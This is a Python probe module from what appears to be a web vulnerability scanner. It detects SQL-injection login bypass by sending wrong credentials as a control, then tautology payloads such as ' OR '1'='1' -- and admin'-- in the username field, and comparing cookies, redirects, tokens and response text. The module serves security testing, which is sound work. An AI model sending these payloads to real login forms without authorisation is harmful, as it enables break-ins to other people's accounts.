"""SQL-injection authentication bypass on login forms.

The other SQLi probes look for a database error (error-based), a delay
(time-based), or a boolean flip. None catch the classic login bypass, where a
tautology payload simply logs you in and returns a *success* response with no
error at all. This probe is differential: it submits wrong credentials as a
control, then a tautology in the username field, and flags a bypass when the
payload produces a logged-in response the wrong credentials did not, judged by
a new session/data cookie, a redirect away from the login page, or success vs
failure markers in the body.
"""

from __future__ import annotations

import httpx

from shroodler.models import Finding
from shroodler.pacer import Pacer
from shroodler.probes.common import body_text, normalize_params, request

_USER_FIELDS = ("uid", "user", "username", "userid", "email", "login", "account", "loginid")
_PASS_FIELDS = ("passw", "password", "pass", "pwd", "passwd", "pin")
_BYPASS_PAYLOADS = (
    "' OR '1'='1' -- ",
    "' OR 1=1-- ",
    "admin'-- ",
    "' OR '1'='1",
)
_SUCCESS_MARKERS = ("logout", "sign out", "signout", "welcome", "dashboard", "my account")
# JSON APIs rarely set a cookie on login; they return a bearer token in the body.
_TOKEN_MARKERS = ('"token"', '"access_token"', '"authentication"', '"jwt"', '"id_token"')
_API_LOGIN_HINTS = ("/rest/", "/api/", "/graphql", "/v1/", "/v2/", "/oauth")
_FAIL_MARKERS = (
    "invalid",
    "failed",
    "incorrect",
    "wrong",
    "denied",
    "try again",
    "bad credentials",
    "not recognized",
)
_LOGIN_HINTS = ("login", "signin", "sign-in", "auth", "session", "logon")


def _first(names: list[str], candidates: tuple[str, ...]) -> str | None:
    lowered = {n.lower(): n for n in names}
    for cand in candidates:
        for low, orig in lowered.items():
            if cand == low or cand in low:
                return orig
    return None


def _cookie_names(resp: httpx.Response | None) -> set[str]:
    if resp is None:
        return set()
    try:
        return set(resp.cookies.keys())
    except Exception:  # noqa: BLE001
        return set()


def _location(resp: httpx.Response | None) -> str:
    if resp is None:
        return ""
    try:
        return str((resp.headers or {}).get("location") or "")
    except Exception:  # noqa: BLE001
        return ""


def _is_redirect(resp: httpx.Response | None) -> bool:
    return resp is not None and 300 <= int(getattr(resp, "status_code", 0) or 0) < 400


def _status(resp: httpx.Response | None) -> int:
    return int(getattr(resp, "status_code", 0) or 0)


def _looks_bypassed(control: httpx.Response, attempt: httpx.Response) -> str:
    """Return a reason string if `attempt` looks logged-in vs `control`, else ''."""
    new_cookies = _cookie_names(attempt) - _cookie_names(control)
    if new_cookies:
        return f"new cookie(s) set: {sorted(new_cookies)}"
    cstat, bstat = _status(control), _status(attempt)
    # API logins: wrong creds are rejected (>=400), a bypass returns 200/201.
    if cstat >= 400 and 200 <= bstat < 300:
        return f"status flipped {cstat} -> {bstat} for the tautology payload"
    cloc, bloc = _location(control).lower(), _location(attempt).lower()
    if _is_redirect(attempt) and bloc and bloc != cloc:
        if not any(h in bloc for h in _LOGIN_HINTS):
            return f"redirect to {_location(attempt)} (control -> {_location(control) or 'none'})"
    cbody, bbody = body_text(control).lower(), body_text(attempt).lower()
    # A bearer token appearing only after the payload is a strong bypass signal.
    if any(m in bbody for m in _TOKEN_MARKERS) and not any(m in cbody for m in _TOKEN_MARKERS):
        return "auth token present only after the payload"
    if any(m in bbody for m in _SUCCESS_MARKERS) and not any(m in cbody for m in _SUCCESS_MARKERS):
        return "success marker present only after the payload"
    if any(m in cbody for m in _FAIL_MARKERS) and not any(m in bbody for m in _FAIL_MARKERS):
        return "failure marker present only for wrong credentials"
    return ""


def _encoding_rejected(resp: httpx.Response | None) -> bool:
    """True when the server rejected the request *format* (not the credentials)."""
    if resp is None:
        return True
    status = _status(resp)
    if status == 415:  # Unsupported Media Type
        return True
    if status in (400, 422, 500):
        body = body_text(resp).lower()
        hints = ("content-type", "json", "unexpected token", "parse", "malformed", "must be")
        if any(h in body for h in hints):
            return True
    return False


def probe_auth_bypass(
    url: str,
    method: str,
    params: list[dict],
    cookie_header: str,
    *,
    client: httpx.Client | None = None,
    pacer: Pacer | None = None,
) -> list[Finding]:
    method_u = (method or "POST").upper()
    if method_u not in {"POST", "PUT"}:
        return []
    url_l = url.lower()
    login_path = any(h in url_l for h in _LOGIN_HINTS)
    api_path = any(h in url_l for h in _API_LOGIN_HINTS)
    normalized = normalize_params(params)
    names = [str(p.get("name")) for p in normalized if isinstance(p, dict) and p.get("name")]
    user_field = _first(names, _USER_FIELDS)
    pass_field = _first(names, _PASS_FIELDS)
    synthesized = False
    if not names:
        # JSON API logins often expose no HTML form params. Synthesize the
        # conventional field names when the path itself is login-shaped.
        if not login_path:
            return []
        user_field, pass_field = "email", "password"
        synthesized = True
    # Login-shaped: a password field, or a login-ish path with an identity field.
    if not pass_field and not (user_field and login_path):
        return []

    base: dict[str, str] = {
        str(p["name"]): str(p.get("value") or "shroodlerx")
        for p in normalized
        if isinstance(p, dict) and p.get("name")
    }

    def _send(body: dict[str, str], encoding: str) -> httpx.Response | None:
        kw = {"json": body} if encoding == "json" else {"data": body}
        return request(
            method_u, url, cookie_header=cookie_header, client=client, pacer=pacer, **kw
        )

    control_form = dict(base)
    if user_field:
        control_form[user_field] = "shroodler_no_such_user@example.com"
    if pass_field:
        control_form[pass_field] = "shroodler_wrong_pass"

    # Modern API logins take JSON; classic HTML forms take urlencoded. Try the
    # likelier encoding first and fall back only if the format is rejected.
    encodings = ["json", "form"] if (api_path or synthesized) else ["form", "json"]
    control: httpx.Response | None = None
    encoding = ""
    for enc in encodings:
        candidate = _send(control_form, enc)
        if not _encoding_rejected(candidate):
            control, encoding = candidate, enc
            break
    if control is None:
        return []

    for payload in _BYPASS_PAYLOADS:
        attempt_form = dict(base)
        if user_field:
            attempt_form[user_field] = payload
        if pass_field:
            attempt_form[pass_field] = "x"
        attempt = _send(attempt_form, encoding)
        if attempt is None:
            continue
        reason = _looks_bypassed(control, attempt)
        if reason:
            return [
                Finding(
                    id="sqli-auth-bypass",
                    severity="critical",
                    category="payload",
                    url=url,
                    description=(
                        "Authentication bypass via SQL injection: a tautology in the "
                        f"login field produced a logged-in response that wrong "
                        f"credentials did not ({reason})."
                    ),
                    evidence=f"field={user_field} payload={payload!r} signal={reason}",
                    confidence="confirmed",
                )
            ]
    return []
